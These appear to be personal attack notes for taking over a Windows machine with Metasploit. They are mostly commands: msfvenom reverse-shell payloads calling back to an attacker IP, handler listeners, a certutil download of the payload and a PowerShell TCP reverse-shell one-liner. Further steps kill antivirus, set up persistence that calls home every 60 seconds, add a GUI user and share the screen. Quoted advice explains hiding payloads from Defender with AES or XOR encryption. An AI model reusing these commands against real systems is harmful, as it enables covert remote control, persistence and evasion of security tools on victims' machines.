**attacker machine**

create payload with msfvenom

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_LOCAL_IP> LPORT=4444 -o SystemProcess.exe`

msfvenom --list payloads | grep "windows/x64/"

proper format

`msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o veilrulsus.exe LHOST=192.168.1.154 LPORT=443`

`msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh -o veilrulsus.ps1 LHOST=192.168.1.154 LPORT=443`

set up listner

`msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.154; set lport 443; set ExitOnSession false; exploit -j"`

run server to host executable / text files

`python3 -m http.server 5555`

**victim machine** 
get payload

Disable anti-virus, firewall, allow scripting, use non OS browser, 

1) download through brower
http://<ip>:5555/
if can not download file through simple server, open ps as admin
navigate to temp directory

2) try ps command
certutil.exe -urlcache -f http://<IP>:5555/SystemProcess.exe SystemProcess.exe

3) transfer a txt file with ps command (definitely fastest)
Enter this command on the WINDOWS machine with POWERSHELL OPENED as ADMINISTRATOR - 
`$sm=(New-Object Net.Sockets.TCPClient("192.168.1.154",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$bypass = "ASCII";$st=([text.encoding]::$bypass).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}`

for ps command shell  (windows is blocking web_delivery module for < windows 10)
```
search web_delivery
use 1
set TARGET 2
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.154
set LPORT 1122
set SRVPORT 8081
run
```



for executable 
```
use exploit/multi/handler
set LPORT 4444
set LHOST YOUR_LOCAL_IP
set payload windows/x64/meterpreter/reverse_tcp
run

```

use post/windows/manage/killav
set SESSION <SESSION_ID>


run persistence -A -X -i 60 -p 3808 -r 192.168.1.154

```
bg
search screenshare
use post/multi/manage/screenshare
set SESSION <SESSION_ID> 
set SRVPORT 8188
run
```

After persistance 
`msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.154; set lport 443; set ExitOnSession false; exploit -j"`


`msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.154; set lport 3808; set ExitOnSession false; exploit -j"`

`-x use post/multi/manage/screenshare; set SESSION <SESSION_ID>; set SRVPORT 8188; run`

`msfconsole -x "use post/multi/manage/screenshare; set SESSION 0; set SRVPORT 8188; exploit -j"`

**victims machine**

av add port and whatever it need to let program run

hit port to download file



**attacker machine**

```
bg
search screenshare
use post/multi/manage/screenshare
set SESSION <SESSION_ID> 
set SRVPORT 8188
run
```



persistance 

after getting shell run these AS ADMIN

this will disconect user (noisy)
run getgui -e -u SystemAdministator -p xTk8cJeSN

call attacker every 60 seconds
run persistence -A -X -i 60 -p 3808 -r <attackerIP>


when victim IP changes, the listener won't pick it up
need to setup domains or msf on an instance with static ip, 

**Analysis**

To do:
-  run Threat check
-  defender & amsi bypass payload 
-  coalfire write
-  make shell with nps_payload ... 

3 Reboots with persistance, will not work,,, suggestions from Sam:

"Depending on how you disabled defender, modern windows operating systems will turn it back on periodically (including at reboot). It likely squashes it at runtime. For persistence, I like to keep it simple. I tend to insert a scheduled job that has PowerShell read a script from a URL. It lets me change behavior and payloads without needing access to the target machine. 
Any sort of metasploit payload straight out the can will always get flagged - every script kiddy ever is using the same payloads. That's not to say they can't be used - you could encrypt the payload and decrypt it when the executable is run. I've used AES to hide payloads before (XOR works too sometimes - I've even just reversed the byte array of a payload and defender didn't spot it)"

From WYWM Cyber Chat

[Threat Check](https://github.com/rasta-mouse/ThreatCheck) identifies the bytes that Microsoft Defender / AMSI Consumer flags on. 

[Open EDR](https://github.com/ComodoSecurity/openedr) Elastic Search & File Beat Service

[write-up from coalfire](https://www.coalfire.com/the-coalfire-blog/executing-meterpreter-on-windows-10)